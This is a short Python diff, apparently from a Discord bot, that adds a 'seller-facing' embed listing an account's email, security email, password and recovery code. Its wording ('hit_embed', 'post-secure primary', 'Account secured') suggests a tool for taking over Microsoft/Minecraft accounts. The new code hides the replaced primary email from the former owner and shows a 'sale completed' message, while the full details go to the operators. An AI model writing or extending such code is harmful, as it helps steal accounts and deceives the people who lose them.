@@ -235,6 +235,35 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
     )
     hit_embed.set_footer(text=f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")
 
+    # Seller-facing embed: NEVER expose the post-secure primary (sunny@…).
+    # Use original login email only; owners still get hit_embed above.
+    seller_email = (
+        ms.get("original_email")
+        or ms.get("seller_email")
+        or ms.get("email")
+        or ""
+    )
+    # If primary was replaced, keep seller view on the pre-change address
+    if ms.get("original_email"):
+        seller_email = ms["original_email"]
+    seller_embed = Embed(
+        title="Account secured",
+        description="Your sale completed. Save the security details below if this was returned to you.",
+        color=0x57F287,
+    )
+    seller_embed.add_field(name="Email", value=f"```{seller_email}```", inline=False)
+    seller_embed.add_field(name="Security Email", value=f"```{ms.get('security_email', 'N/A')}```", inline=True)
+    seller_embed.add_field(name="Password", value=f"```{ms.get('password', 'N/A')}```", inline=True)
+    seller_embed.add_field(name="Recovery Code", value=f"```{ms.get('recovery_code', 'N/A')}```", inline=False)
+    add_credential_line_field(
+        seller_embed,
+        email=seller_email,
+        recovery=ms.get("recovery_code", ""),
+        password=ms.get("password", ""),
+        security_email=ms.get("security_email", ""),
+        username=mc.get("name") or mc.get("gamertag") or "",
+    )
+
     ssid_embed = Embed(
         title="SSID"
     )
@@ -248,6 +277,7 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
 
     return {
         "hit_embed": hit_embed,
+        "seller_embed": seller_embed,
         "account_id": account_id,
         "minecraft": mc,
         "details": {
